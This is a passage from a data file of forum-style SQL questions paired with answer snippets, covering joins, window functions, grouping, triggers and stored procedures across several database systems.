SELECT ItemId
  ,ItemversionId
  ,Year
  ,Value
FROM Result
WHERE RowNumber = 1
ORDER BY ItemId, Year
"
15099,45190,Transpose column result in resultset to rows,"SELECT continent, GROUP_CONCAT(county ORDER BY country) as Countries 
FROM tablexxx
GROUP BY continent
ORDER BY continent
"
25530,15827,Selecting distinct row of many database based on date field,"--3-4pm
SELECT Name
FROM TableName
WHERE Date > 'YYYY/mm/dd' AND Date < 'YYYY/mm/dd'
AND ID NOT IN ( 
                --5-6pm
                SELECT ID
                FROM TableName
                WHERE Date > 'YYYY/mm/dd' AND Date < 'YYYY/mm/dd'
              )
"
39556,33032,How do I group by minimum values in a SQL query?,"select distinct on (property_id) id, property_id, image_url
from image
order by property_id, image_priority;
"
38611,48639,select date_add mysql issue,"SELECT columnList
FROM loans
WHERE CURDATE() < DATE_ADD(`date`, INTERVAL pay_period DAY)
"
2416,8061,SQL to 'group' certain records,"select cycle_start, cycle_end,
       min(activity_start) as activity_start, 
       max(activity_end) as activity_end, 
       (case when Activity = 'D' then 'D' else 'Merged' end)
from table t
group by cycle_start, cycle_end,
         (case when Activity = 'D' then 'D' else 'Merged' end)
"
1583,29055,SQL query for sorting on the column partial value,"SELECT  SUBSTRING_INDEX(code, ':', 1) AS dept
        SUBSTRING_INDEX(code, ':', -1) AS sr_no
FROM    mytable
ORDER BY
        sr_no
"
18511,24108,Count rows belonging together,"row_number()over(partition by ID order by something)
"
13448,5202,Quest Regarding to Generate the Row Number,"    USE tempdb;
    GO
    IF OBJECT_ID('dbo.name','U') IS NOT NULL DROP TABLE dbo.name;
    CREATE TABLE dbo.name
    (
    sno INT NOT NULL PRIMARY KEY
    ,fname VARCHAR(50)
    ,lname VARCHAR(50)
    )
    INSERT INTO dbo.name(sno,fname,lname)
    VALUES
    (1,'Vandana','Pandey')
    ,(2,'Ritesh','Kumar')
    ,(3,'Kumar','Ritesh')
    ,(4,'Pandey','Vandana')
    ,(5,'Priya','Kapoor');


    WITH cte_names AS
    (
    Select  n.sno
            ,n.fname + ' ' + n.lname AS fname_first
    From    dbo.name n
    UNION ALL
    Select  n.sno
            ,n.lname + ' ' + n.fname AS lnames_first
    From    dbo.name n
    )

    ,cte_dense_rank AS
    (
    Select  cn.sno
            ,cn.fname_first
            ,DENSE_RANK() OVER( ORDER BY cn.sno) AS [Row_Number]
    From    cte_names cn
    )

    , cte_row_num AS
    (
    Select      n.sno,rn.[Row_Number]
    From        dbo.name n
    Inner Join  cte_dense_rank AS rn
        ON      n.fname + ' ' + n.lname = rn.fname_first
    )

    Select      n.sno,n.fname,n.lname
                ,DENSE_RANK() OVER(ORDER BY MIN(mr.[Row_Number])) AS [Row_Number]
    From        dbo.name n
    Inner Join  cte_row_num mr
        ON      n.sno = mr.sno
    Group By    n.sno,n.fname,n.lname
    Order BY    n.sno
"
2984,25322,mySQL slow counting primary keys with subquery,"  SELECT COUNT(*) FROM users u 
  left join clients c
  on u.id = c.userID 
  where u.id not in (select userID from clients)
"
33522,61086,Returning ID of the table for corresponding aggregate result,"select  id
from    YourTable
order by
        val3 - val1
limit   1
"
8409,6906,Combine 2 query output in one result set,"DECLARE @a TABLE (col int);
DECLARE @b TABLE (col char(1));
INSERT INTO @a VALUES (1);
INSERT INTO @a VALUES (2);
INSERT INTO @a VALUES (3);
INSERT INTO @a VALUES (4);
INSERT INTO @a VALUES (5);
INSERT INTO @b VALUES ('A');
INSERT INTO @b VALUES ('B');
INSERT INTO @b VALUES ('C');

SELECT B.col, A.col
FROM ( SELECT col, ROW_NUMBER() OVER(ORDER BY col) AS RowNum FROM @a ) AS A
LEFT JOIN ( SELECT col, ROW_NUMBER() OVER(ORDER BY col) AS RowNum FROM @b ) AS B ON A.RowNum = B.RowNum
"
36227,9533,Extract Two Sets of Data With One SQL Script,"CREATE VIEW view_name AS
    SELECT * FROM
    (
    SELECT MemberID, a.UserName, a.MemberDisplayName, a.NYKABizName, a.PackageType
    FROM Member a
    WHERE a.Claimed = 'Y'
    AND a.PrCity = 'Bridgewater'
    AND a.PrStateID = 36
    AND a.PackageType = 'E'
    ORDER BY a.MemberDisplayName
    ) x 
    UNION 
    (
    SELECT MemberID, a.UserName, a.MemberDisplayName, a.NYKABizName, a.PackageType
    FROM Member a
    WHERE a.Claimed = 'Y'
    AND a.PrStateID = 36
    AND a.PackageType = 'E'
    ORDER BY a.MemberDisplayName
    ) y
"
12784,53401,Allocated Cost Calculation in Oracle PL SQL Query [logical],"select 
BusinessUnit, CustomerID, ProductFamily , Revenue
, (table1.Cost * table2.Revenue ) 
  / (SUM(Revenue) over(partition by table1.BusinessUnit, table1.ProductFamily )) 
                 AS  Allocated_Cost
from 
    table1 
    INNER JOIN table2 ON ( table1.BusinessUnit =  table2.BusinessUnit
                          AND table1.ProductFamily = table2.ProductFamily )
;
"
18574,63110,Stored procedure dealing with multiple records,"INSERT INTO recEntrantStatus (entrantId, roundId, judgeId, notified, voted, enterNextRound)
SELECT r.entrantId, (@round + 1), j.judgeId /*Now getting tblJudges Id*/, 0, 0, 0
FROM recEntrantStatus r
    -- Get all of the judges
    CROSS JOIN (SELECT DISTINCT Id AS judgeId FROM tblJudges) AS j
WHERE r.roundId = @round
    AND r.voted = 1 -- Is this based on a judge or an entrant status?
    AND r.enterNextround = 1
"
16306,29140,Limit a LEFT JOIN Subquery to 1 result,"SELECT
    GROUP_CONCAT( projected_hours_last.secondMaxDate, '|', projected_hours_last.number ) AS 'projected_last_info'
FROM
projects


LEFT JOIN (
    SELECT project_id, max(date) as maxDate,
           substring_index(substring_index(group_concat(date order by date desc), ',', 2), ',', -1
                            ) as secondMaxDate
    FROM
    projected_hours_archive
    group by project_id
) AS projected_hours_last ON ( projected_hours_last.project_id = projects.id )

WHERE projected_hours > 0

GROUP BY projects.id
"
21962,25032,"Window functions in view called with ""where"" gives bad execution plan","select name,LAG(column_id) OVER (ORDER BY system_type_id) as cid
from sys.columns
where name='name'

select * from (
select name,LAG(column_id) OVER (ORDER BY system_type_id) as cid
from sys.columns
) t
where name='name'
"
25016,37374,SQL Query optimisation not exists,"create index [<indexname>] on [Job] (
    [company], [branch], [engineerNumber], [ID]) include ([JobNumber]);
create index [<indexname>] on [OutboundEvents] (
    [company], [branch], [JobNumber], [Formtype]);
"
3153,16849,SQL: best way to build a timeline from two history tables,"--
-- Traverse down a list of 
-- unique Member ID and StartDates
-- 
-- For each row find the most 
-- recent PCP for that member 
-- which started on or before
-- the start date of the current
-- row in the traversal
--
-- For each row find the most 
-- recent PlanID for that member
-- which started on or before
-- the start date of the current
-- row in the traversal
-- 
-- For each row find the earliest
-- end date for that member
-- (from a collection of unique
-- member end dates) that happened
-- after the start date of the
-- current row in the traversal
-- 
SELECT MemberID,
  (SELECT TOP 1 PCP 
   FROM MemberPCP 
   WHERE MemberID = s.MemberID 
   AND StartDate <= s.StartDate 
   ORDER BY StartDate DESC
  ) AS PCP,
  (SELECT TOP 1 PlanID 
   FROM MemberPlans 
   WHERE MemberID = s.MemberID 
   AND StartDate <= s.StartDate 
   ORDER BY StartDate DESC
  ) AS PlanID,
  StartDate,  
  (SELECT TOP 1 EndDate 
   FROM (
    SELECT MemberID, EndDate 
    FROM MemberPlans 
    UNION 
    SELECT MemberID, EndDate 
    FROM MemberPCP) e
   WHERE EndDate >= s.StartDate 
   ORDER BY EndDate
  ) AS EndDate
FROM ( 
  SELECT
    MemberID,
    StartDate
  FROM MemberPlans
  UNION 
  SELECT
    MemberID,
    Startdate
  FROM MemberPCP
) s
ORDER BY StartDate
"
2572,26118,Selecting distinct values where input is in another column,"SELECT DISTINCT id
FROM myTable
WHERE @myInput IN (rColumn, sColumn);
"
29189,44279,select resultset of two tables without merging result,"select t1.col1 as cola, t2.col1 as colb
from (select t1.*, row_number() over (order by id) as seqnum from table1 t1) t1 full outer join
     (select t2.*, row_number() over (order by id) as seqnum from table2 t2) t2
     on t1.seqnum = t2.seqnum;
"
6120,22589,"SQL Relations, Triggers and Foreign Keys","CREATE TRIGGER testref BEFORE INSERT ON test1
  FOR EACH ROW BEGIN
    INSERT INTO test2 SET a2 = NEW.a1;
    DELETE FROM test3 WHERE a3 = NEW.a1;
    UPDATE test4 SET b4 = b4 + 1 WHERE a4 = NEW.a1;
  END;
|
"
3640,57003,Getting ancestors from oracle sql table,"-- sample of data
SQL> with t1(CHILD_ID, PARENT_ID) as(
  2    select 1,  2  from dual union all
  3    select 6,  12 from dual union all
  4    select 2,  3  from dual union all
  5    select 3,  4  from dual union all
  6    select 9,  82 from dual
  7  ) -- actual query
  8  select child_id
  9    from t1
 10  start with parent_id = 4
 11  connect by parent_id = prior child_id
 12  ;

  CHILD_ID
----------
         3
         2
         1
"
30061,34960,Concatenating two tables distributively,"SELECT     a.*, b.*
FROM       a
CROSS JOIN b
"
37370,6267,"sql server group by, count, compute","select purchased_profileid, count(*) as 'NoofPurchases', sum(final_paidprice)  from MMBMembership mmb, MMB_BusinessProfiles mmbProfiles, basic_details bd, orderdetails_purchasedProfiles odpp
where mmb.mmb_id = mmbProfiles.MMB_id
and mmb.Profile_id = ltrim(bd.profile_id)
and odpp.purchased_profileid = bd.profile_id
and mmb.mmb_id = 1
and ispublished='true'
group by  purchased_profileid
"
34906,65258,Exclude results in a sql query,"select distinct t1.name
from tablename t1
where not exists (select 1 from tablename t2
                  where t2.name = t1.name
                    and 'passed' in (t2.old_v, t2.new_v))
"
19426,71925,Using GROUP BY and ORDER BY with Multiple INNER JOINS,"select objects.user_id user_id, sum(likes.like_count) like_count
from (
    select user_id, id
    from prod.pictures
    union all
    select creator_id, id
    from prod.videos
    union all
    select author_id, id
    from prod.posts) objects
join (select obj_id, count(*) likes_count
      from likes_service.likes
      group by obj_id) likes on likes.obj_id = objects.id
group by user_id
order by like_count desc
"
3535,14206,Oracle SQL -- insert multiple rows into a table with one statement?,"INSERT INTO attribute_list (id, value, name)
SELECT id, 'Y', 'is_leveled'
FROM value_list WHERE val >= 50
"
13791,32855,Upload images and return filenames to DB,"    $this->add('filestore/Field_Image', array(
        'name'=>'previewIMG',
        'use_model'=>'filestore/Model_Image'
    ));
"
24808,5287,Tracking data changes per table column in T-SQL,";WITH LagCTE AS (
  SELECT  id, fruit, price, qty, created,
          LAG(price) OVER (PARTITION BY fruit 
                           ORDER BY created) AS prevPrice,
          LAG(qty) OVER (PARTITION BY fruit 
                         ORDER BY created) AS prevQty
  FROM mytable
)
SELECT ROW_NUMBER() OVER (ORDER BY changed) AS id,
       fk, col, oldval, newval, changed
FROM (       
  SELECT id AS fk, fruit, 'price' AS col, 
         prevPrice AS oldval, price AS newval, 
         created AS changed
  FROM LagCTE
  WHERE prevPrice <> price

  UNION ALL 

  SELECT id AS fk, fruit, 'qty' AS col, 
         prevQty AS oldval, qty AS newval, 
         created AS changed
  FROM LagCTE
  WHERE prevQty <> qty) AS t
"
18760,58863,calculate between 2 row 2 column and different userID - SQL 2012,"declare @MyTable table
(UserID int, StartDate datetime, FinishDate datetime);

insert into @MyTable values
('1', '2013-11-25 14:25', '2013-11-25 16:35'),
('2', '2013-12-01 10:20', '2013-12-02 12:20'),
('2', '2013-12-06 09:15', '2013-12-06 16:15'),
('1', '2013-12-08 08:00', '2013-12-08 16:30'),
('1', '2013-12-09 07:45', '2013-12-15 09:45');



 select
  FinishDate New_Start_dt,        
  LEAD(startdate,1,NULL) over(partition by userid order by startdate) New_finish_dt,
  DATEDIFF(minute,FinishDate,LEAD(StartDate,1,NULL) over(partition by userid order by StartDate)) as DifHours
        from @MyTable
"
34840,55700,mysql : bining a column data,"select id, my_column,
case when my_column < 100 and my_column >=1 then 1
     when my_column < 200 and my_column >=100 then 2
     when my_column < 400 and my_column >=300 then 3
     when my_column >=400 then 4
end as Bins
from yourtable
"
24188,48240,Greatest Date group by TCP address,"select yt.id, yt.tcpAddress, yt.analog, yt.discrete, yt.counter, yt.date 
from xactions yt 
inner join ( 
  select tcpAddress, max(date) date 
  from xactions 
  where tcpAddress in ('192.168.1.161', '192.168.1.162')
  group by tcpAddress
 ) ss using (tcpAddress, date);
"
8712,1197,SQL query to return columns and values which match part of a where condition,"
Select a.*, b.*, mycond1, mycond2, mycond3
From a
    Inner Join b On a.pk = b.pk
    … rest of normal query …

        -- set of conditions --
    Left Outer Join (select 1 as matched where mycondition1) mycond1
    Left Outer Join (select 1 as matched where mycondition2) mycond2
    Left Outer Join (select 1 as matched where mycondition3) mycond3

-- Relationship between conditions
Where (mycond1.matched is not null or mycond2.matched is not null) and mycond3 is not null
"
24361,71460,How to set sql field value equal to another value in the same table,"UPDATE l1
SET COST = l2.COST
FROM TableA l1
INNER JOIN TableA l2 ON l2.Location = 2 AND l1.item = l2.item
WHERE l1.location = 1 and l1.item = 1
"
22840,64985,How do you validate XML stored procedure parameter against XSD with namespace in MS SQL?,"CREATE PROCEDURE [dbo].[sp_InsertPerson] (
    @xmlData XML (dbo.PersonSchemaCollection)
)
AS
BEGIN

-- this is the part that I was missing
WITH XMLNAMESPACES('http://example.org/People' as tns)

INSERT INTO dbo.Person
  (LastName, FirstName, Gender, DateOfBirth, IsFriendly)
SELECT 

  -- additionally note the tns prefix for all of the fields and nodes
  person.field.value('(tns:FirstName)[1]', 'nvarchar(100)'),
  person.field.value('(tns:LastName)[1]', 'nvarchar(100)'),
  person.field.value('(tns:Gender)[1]', 'char(1)'),
  person.field.value('(tns:DateOfBirth)[1]', 'datetime'),
  person.field.value('(tns:IsFriendly)[1]', 'bit')
FROM @xmlData.nodes('/tns:People/tns:Person') AS person(field)

SELECT CAST(SCOPE_IDENTITY() as int)
END
GO
"
33797,72674,MySQL aggregation function to sum the differences from row to row,"SELECT a.id, 
       b.VALUE - a.VALUE difference 
FROM   mytable a 
       JOIN mytable b 
         ON b.id = a.id + 1 
"
32993,25327,SQL - Update multiple values at one position,"update yourtable 
set number = replace(number, '-', '0-')
where number like '_____-__'
"
25575,71640,How can I filter a table with duplicate entries to display the rows that exist the most?,"SELECT  music_ID, genre_ID
FROM    TableName a
GROUP   BY music_ID, genre_ID
HAVING  COUNT(*) = (SELECT COUNT(*) total 
                    FROM    tableName b
                    WHERE a.music_ID = b.music_ID
                    GROUP   BY music_ID, genre_ID
                    ORDER BY total DESC
                    LIMIT 1)
"
25212,18919,Postgresql get list of rows from last update statement,"UPDATE test
    SET title = (case when id in (1, 2, 3) then 'dont delete this' else title end),
        delete = (case when id in (1, 2, 3) then delete else true end);
"
38955,7520,T-SQL | Summarize grouped aggregates into a string,"SELECT
    tag1
    ,tag2 
    ,tag3
    ,SUM(CASE WHEN invalidflag = 0 and junkFlag = 0 then old else 0 end) as oldvalid
    ,SUM(CASE WHEN invalidflag = 1 and junkFlag = 0 then old else 0 end) as oldvinvalid 
    ,SUM(CASE WHEN invalidflag = 0 and junkflag = 1 then old else 0 end) as oldjunk

    ,SUM(CASE WHEN invalidflag = 0 and junkFlag = 0 then new else 0 end) as newvalid
    ,SUM(CASE WHEN invalidflag = 1 and junkFlag = 0 then new else 0 end) as newinvalid 
    ,SUM(CASE WHEN invalidflag = 0 and junkflag = 1 then new else 0 end) as newjunk
FROM 
    #tab1
GROUP BY 
    tag1, tag2, tag3
"
37085,57455,Error in creating temporary table in mysql,"SET @sql = CONCAT('CREATE TEMPORARY TABLE IF NOT EXISTS table2 AS SELECT t.Time, ', @sql, ' 
                   FROM sms.hotelings h, sms.hotelingtime t 
                   GROUP BY t.Time');
PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;
SELECT * FROM table2;
DROP TEMPORARY TABLE table2;
"
39016,44531,Query to Return One Row per Person,"with priorityRank as
(
  select *
    , priorityRank = row_number() over (partition by Person
        order by case Priority when 'High' then 1 when 'Low' then 2 end
          , Id)
  from
  Answers
)
select Id
  , Person
  , Answer
  , Priority
from priorityRank
where priorityRank = 1
"
3418,46950,Join three tables using single query,"SELECT s.CustomerId, SUM( s.Total ) Totalbilled, p.CustomerID, SUM( p.Amountofpaying ) TotalPaid
FROM  `userdetails` AS ud
LEFT JOIN  `saletrack` AS s ON ud.CustomerIndex = s.CustomerId
LEFT JOIN  `paymentdetails` AS p ON ud.CustomerIndex = p.CustomerID
LIMIT 0 , 30
"
16108,14194,writing procedure output to file with column header,"-- Create Temp Table 
CREATE TABLE #TMP_TABLE(COL1 varchar(50), COL2 varchar(50), COL3 varchar(100));

-- Insert Stored Proc Data in Temp Table
INSERT INTO #TMP_TABLE
EXEC dbo.myproc;

-- Select Column name + Date (Use ' not "" for String delimiter)
SELECT 'COL1', 'COL2', 'COL3'
UNION ALL
SELECT * FROM #TMP_TABLE;
"
29700,39222,Oracle NULL value also filtering,"select * from customer where category is null or category != 'Student'
"
6814,15654,MySQL query: GROUP BY - get specific row (not always the first one),"SELECT id, 
  sort,
  (SELECT COUNT(*) 
   FROM images t 
   WHERE t.album_id = i.album_id) AS count
FROM images i
WHERE user_id = 15
      AND sort = 0
"
14166,35375,Converting two string fields into datetime,"SELECT
DateSerial(Val(Mid(EventD,7,4)), Val(Mid(EventD,4,2)), Val(Mid(EventD,1,2))) + TimeSerail(Val(Mid(EventT,1,2)), Val(Mid(EventT,4,2)), Val(Mid(EventT,7,2))) As DateTimeValue
FROM Table1
"
25297,34283,Many to many relationship and MySQL,"SELECT subscriber_id FROM subscriptions WHERE user_id = 123;
"
33929,31585,"SQL query, sorting","select * from
(select *, row_number() over(partition by transactionid order by modified_date desc) rn from table) t
whete rn = 1
"
10377,14653,Issue with SELECTing a value from one coloumn that is dependant on another SQL,"SELECT product, SUM(status = 'booking') as CountOf 
FROM sw_orders 
GROUP BY product;
"
12485,6346,SQLite3 with multiple WHERE,"if (sqlite3_bind_double( 
      statement,
      1,  // Index of wildcard
      4.2 // Value
      ) != SQLITE_OK) {
  // Error handling...
}
"
17704,62500,How to call a stored procedure without waiting for it to finish?,"		Thread statisticsThread = new Thread(new ThreadStart(YourSPWrapper));
		statisticsThread.Priority = ThreadPriority.Lowest;
		statisticsThread.Start();
"
23939,56726,SELECT from external data in MySQL,"SELECT id, name, score.score FROM
        someTable,
        (SELECT 12 as someTableId,324 as score UNION ALL SELECT 1, 342 <UNION ALL....>) as score(id, score)
WHERE score.someTableId == id
ORDER BY score.score DESC
"
9662,25329,NHibernate - Mixing subquery and an eager left join,"<property name=""Description"" type=""Type,Namespace"" formula=""(select inf.Description from Info inf 
where inf.ProductId = product.Id where inf.Year = 2010 limit 1)""/>
"
15116,21656,SQL Deleting while checking data from another table,"DELETE w FROM words w
INNER JOIN lists l on l.id = w.listid
WHERE 
l.username = 'admin'
AND w.listId = 31
"
5521,64461,SQL Nested Replace,"select replaceN
from T
cross apply (select replace1 = replace(T.col, 'x', 'y')) r1
cross apply (select replace2 = replace(replace1, 'x', 'y')) r2
cross apply (select replace3 = replace(replace2, 'x', 'y')) r3
...
"
31876,74164,Select on records based on two column criterias,"SELECT table1.* 
FROM table1,
(
  SELECT COUNT(*) as cnt, id
  FROM (
    SELECT * 
    FROM table1
    WHERE type = 'a' OR type = 'b'
  ) sub1
  GROUP BY id
  HAVING cnt > 1
)sub2
WHERE table1.id = sub2.id
"
6637,21380,Oracle Help on Selection of data,"SELECT *
FROM 
   SAL_INFO
WHERE
    (DEPTNO, SAL)
    IN
    (
        SELECT 
            DEPTNO, MAX(SAL) 
        FROM SAL_INFO
        GROUP BY DEPTNO
    )
"
31963,9837,CASE statement with GETDATE(),"select
case
    when DAY (GETDATE()) = 25 then  MONTH(GETDATE())
    else  MONTH(GETDATE()) - 1
end
"
28879,19314,MySQL Grouping Query,"SELECT WeekNumber week, date, personid, 
  MAX(CASE WHEN ObjectTypeId=1 THEN ObjectId END) Type1,
  MAX(CASE WHEN ObjectTypeId=2 THEN ObjectId END) Type2
  FROM ObjectToPerson
  GROUP BY week, date, personid
"
35025,73925,Count number of bookings between a set of specified dates,"SELECT date, COUNT(*)
FROM bookings
WHERE checkin >= '2012-06-10' AND checkout <= '2012-06-14'
GROUP BY date
"
17306,31163,SQL two tables distinct counts with join,"select o.customercode, 
       count(distinct o.orderid), 
       count(distinct i.orderid), 
       count(distinct i.orderid)/count(distinct o.orderid) ratio
from table1 o
      left join table2 i on o.orderid = i.orderid and i.issuecode = 'F'
group by o.customercode
"
12020,33568,How to get array/bag of elements from Hive group by operator?,"SELECT F1, collect_set(F2)
FROM sample_table
GROUP BY F1
"
39188,44572,What is the name of the table resulting from a natural join?,"select table1.col1, table2.col2
from table1 natural join
     table2;
"
22900,56013,Aggregrate the polish if make and size are same,"select Make, Size, sum(Polish) as Polish, sum(Rough) as Rough
from TableA
group by Make, Size
"
10207,36797,Join Two tables having different number of columns,"SELECT
  t1.businessid,
  t1.userid,
  t1.name,
  t2.systemid
FROM
  table1 t1
CROSS JOIN
  table2 t2
;
"
19708,44722,SQL: Unknown column 'items.id' Relationship Query,"    SELECT COUNT(*) AS `numrows` 
    FROM `categories_items` 
    LEFT OUTER JOIN `items` ON `items`.`id` = `categories_items`.`item_model_id`
   AND `categories_items`.`category_model_id` = 1
    LEFT OUTER JOIN `items_stones` ON `items`.`id` = `items_stones`.`item_model_id` 
 AND `items_stones`.`stone_model_id` = 1;
"
23503,73138,Insert a certain date format into MySQL,"SELECT DATE_FORMAT(date, ""%m/%d/%y"") as date FROM ....
-- date is now in MM/DD/YY format
"
15730,34964,Mysql Help - Left join,"SELECT ID, CourseName, CourseInstructor, StudentId, CourseId 
FROM Courses as c 
LEFT JOIN StudentLink as sl ON c.id = sl.CourseId  And StudentId = 103 
"
9120,9785,How to do multiple SQL joins so that I get back entities that match certain criteria?,"select b.* from banners b inner join
( select bannerid,count(bannersize) bl from banners
group by bannerid
having count(bannersize) = (select count(distinct(bannersize)) cl from banners) ) ab
on b.bannerid=ab.bannerid
"
35667,62098,How may I store contact methods (or similar typed data with different fields) in a normalized way?,"Contact { PK ContactId, ... }
ContactType { PK ContactTypeId, ContactType }
ContactMethod {PK FK ContactId, PK FK ContactTypeId, PK Key, Value, Comments }
"
29609,62843,I m not be able to get correct number of order_status,"SELECT d.*, 
       SUM(CASE WHEN o.status LIKE '%enquiry%' THEN 1 ELSE 0 END) AS order_status, 
       COUNT(o.pname) AS destiList 
FROM   dstr_operator_master d
LEFT JOIN order_registration o ON FIND_IN_SET(o.user_id, d.u_id) 
WHERE d.status = '1' AND d.type = 'distributor' 
GROUP BY d.auto_id;
"
714,42601,Teradata SQL flag for last X distinct column permutations by rank,"select
   fiscalyear,fiscalweek,
   row_number() over (order by fiscal year,fiscal week) as chrono,
   case when chrono > count(*) over () - 52
        then 'Last52Weeks' 
        else 'NotLast52Weeks'
   end
from table
group by 1,2
"
15611,55412,Trying to find substring in string on sql server,"DECLARE @myparameter as varchar(500) 
set @myparameter = 'Basketball &amp; Soccer & Volleyball'


DECLARE @cleanparam as varchar(500)
SELECT @cleanparam = REPLACE(@myparameter,'&amp;','&') --<----put some trick here :)
SELECT @cleanparam = REPLACE(@cleanparam,'&','&amp;')   
SELECT @cleanparam = REPLACE(@cleanparam,'""','&quot;') 
SELECT @cleanparam = REPLACE(@cleanparam, '©', '&copy;')
SELECT @cleanparam = REPLACE(@cleanparam, '«', '&laquo;') 

SELECT @cleanparam
"
16858,57165,Redshift sort by alphabet would increase performance?,"create table foo (alpha varchar(10) sortkey, bar int);
"
36694,16286,SQL Query for Where IN condition,"SELECT
    * 
FROM 
    user_post
WHERE 
    user_id IN ((SELECT 
                    follow_id 
                FROM 
                    follow 
                WHERE 
                    follow_id=20), 10, 15);
"
22310,64531,Fix auto increment mysql,"ALTER TABLE theTableInQuestion AUTO_INCREMENT=1234  
"
35183,74679,Sort SQL table with values from another table,"   select
       a.requestid
     , a.userid
     , a.datesubmitted
     , a.status
   from
     tblrequests a 
     left join tblimportantusers b on (a.userid = b.userid)
   order by
     (case when status = 1 and b.userid is not null then 1 else 0 end) desc
     , date submitted desc
     , userid desc
"
20761,33823,Condtional insert using a 'WHERE' from another table - not the one inserted into,"INSERT INTO table_1 (table_2_id,y,z) 
SELECT '123','2','3' 
FROM table_2 WHERE valid=1 and id=123
"
34812,41963,finding rank of student in table,"SET @rank = 1, @seq = 1, @last = null;
SELECT *, @rank := if(@last = marks, @rank, @seq) AS rank, @seq := @seq + 1, @last := marks FROM test ORDER BY marks DESC;
"
11478,35456,Need approach for working with small subsets of a large dataset,"    declare @tbl1 table(
id int, Trackingid int, Status varchar(50), StatusDate datetime
)

declare @tbl2 table(
id int, Trackingid int, Status varchar(50), StatusDate datetime
)

----Source data
insert into @tbl1 (id, trackingid, status, statusdate) values(1,1,'PickedUp','10/01/10  1:00') --
insert into @tbl1 (id, trackingid, status, statusdate) values(2,1,'InTransit','10/02/10 1:00') --
insert into @tbl1 (id, trackingid, status, statusdate) values(8,1,'InTransit','10/02/10  3:00')
insert into @tbl1 (id, trackingid, status, statusdate) values(4,1,'Delayed','10/03/10 1:00')
insert into @tbl1 (id, trackingid, status, statusdate) values(5,1,'InTransit','10/03/10 1:01')
insert into @tbl1 (id, trackingid, status, statusdate) values(6,1,'AtDest','10/03/10 2:00')
insert into @tbl1 (id, trackingid, status, statusdate) values(7,1,'Deliv','10/03/10 3:00') --
insert into @tbl1 (id, trackingid, status, statusdate) values(3,2,'InTransit','10/03/10 1:00')
insert into @tbl1 (id, trackingid, status, statusdate) values(9,2,'AtDest','10/04/10 1:00')
insert into @tbl1 (id, trackingid, status, statusdate) values(10,2,'Deliv','10/04/10 1:05')
insert into @tbl1 (id, trackingid, status, statusdate) values(11,1,'Delayed','10/02/10 2:05')

----Target data
insert into @tbl2 (id, trackingid, status, statusdate) values(1,1,'PickedUp','10/01/10  1:00')
insert into @tbl2 (id, trackingid, status, statusdate) values(2,1,'InTransit','10/02/10 1:00')
insert into @tbl2 (id, trackingid, status, statusdate) values(3,1,'Deliv','10/03/10 3:00')


select d.* from
(
    select 
    * ,
    ROW_NUMBER() OVER(PARTITION BY trackingid, CAST((STR( YEAR( statusdate ) ) + '/' +STR( MONTH(statusdate ) ) + '/' +STR( DAY( statusdate ) )) AS DATETIME) ORDER BY statusdate) AS 'RN'
    from @tbl1
) d

where 
not exists
(
    select RN from
    (
        select 
        * ,
        ROW_NUMBER() OVER(PARTITION BY trackingid, CAST((STR( YEAR( statusdate ) ) + '/' +STR( MONTH(statusdate ) ) + '/' +STR( DAY( statusdate ) )) AS DATETIME) ORDER BY statusdate) AS 'RN'
        from @tbl1
    )f where f.RN = d.RN + 1 and d.status = f.status and f.trackingid = d.trackingid and 
    CAST((STR( YEAR( f.statusdate ) ) + '/' +STR( MONTH(f.statusdate ) ) + '/' +STR( DAY( f.statusdate ) )) AS DATETIME) =
            CAST((STR( YEAR( d.statusdate ) ) + '/' +STR( MONTH(d.statusdate ) ) + '/' +STR( DAY( d.statusdate ) )) AS DATETIME)
)

and
not exists 
(
    select 1 from @tbl2 t2
    where (t2.trackingid = d.trackingid
    and t2.statusdate = d.statusdate
    and t2.status = d.status)
)
and (
    not exists
    (
        select 1 from
        (
            select top 1 * from @tbl2 t2 
            where t2.trackingid = d.trackingid
            order by t2.statusdate desc
        ) g
        where g.status = d.status
    )
    or not exists
    (
        select 1 from
        (
            select top 1 * from @tbl2 t2 
            where t2.trackingid = d.trackingid
            and t2.statusdate <= d.statusdate
            order by t2.statusdate desc
        ) g
        where g.status = d.status
    )
)
order by trackingid,statusdate
"
24335,54902,FireBird - serial field as in PGSQL?,"create table objects (
   id integer generated by default as identity primary key,
   name varchar(15)
);
"
14677,13697,Get all parents for given element and their siblings,"with parents as (
  select level lvl, id
  from t_hier
  start with id = 7
  connect by id = prior parent
)
select distinct id from t_hier
where id != 7
start with id in (select id from parents where lvl > 1)
connect by prior id = parent and level <= 2;
"
1464,71740,Combine results to count totals for individuals,"Select u.Id as UserId,  
g.Id as GroupId,
g.name as GroupName,
count(0) as TotalPagesForUser,
Sum(case when p.AnsweredById IS NOT NULL then 1 else 0 end) as TotalAnsweredForUser,
(SELECT COUNT(0) FROM Pagings WHERE GroupId = g.Id) as TotalPagesForGroup,
(SELECT COUNT(0) FROM Pagings WHERE GroupId = g.Id AND AnsweredById IS NOT NULL) as TotalAnsweredForGroup
from UserProfiles u
INNER JOIN Groups g on g.Id = u.GroupId
INNER JOIN Pagings p on p.UserProfileId = u.Id or p.AnsweredById = u.Id
GROUP BY u.Id, g.Id, g.name
ORDER BY u.Id
"
6692,15776,WHERE varchar = variable length of 0's,"SELECT *
FROM Table_A
WHERE NOT Number like '%[^0]%'
AND number like '0%' --But we do want it to contain at least one zero
"
3530,35972,Generate SUM For Foreign Key on one table and append to another in MySQL,"SELECT lr.RequestId, SUM(la.Amount) AS AmountPaid
FROM LoansRequest lr
INNER JOIN LoansAccounts la
ON lr.RequestId = la.RequestId'
GROUP BY lr.RequestId 
"
29364,39949,SQL Delete after a different date for each ID,"With CTE AS
(
   SELECT [Time], [User_ID],
          RN = ROW_NUMBER() OVER (Partition By [User_ID] ORDER BY [Time])
   FROM Table1
   WHERE [Event_Type] = 2
)
DELETE FROM CTE WHERE RN > 1
"
4839,14178,How to write query with like in Doctrine2,"public function findForMonthAndCat($user, $month, $category)
{
    $q = $this
        ->createQueryBuilder('e')
        ->where('e.date LIKE :month')
        ->andWhere('e.user = :user')
        ->andWhere('e.category = :category')
        ->setParameter('month', ""%$month"")
        ->setParameter('user', $user)
        ->setParameter('category', $category)
         ->getQuery();

    return $q->getResult();
}
"
25308,45691,Merge 2 tables for a SELECT query?,"SELECT p.id, COUNT(p.id), SUM(p.points)
FROM (SELECT userh_userid AS id, userh_points AS points
      FROM users_history1
      UNION SELECT userl_userid, userl_points
      FROM users_ladders1) AS p
GROUP BY p.id
"
3717,47262,Stored procedures (delete invoice),"@InvoiceID int
AS
BEGIN
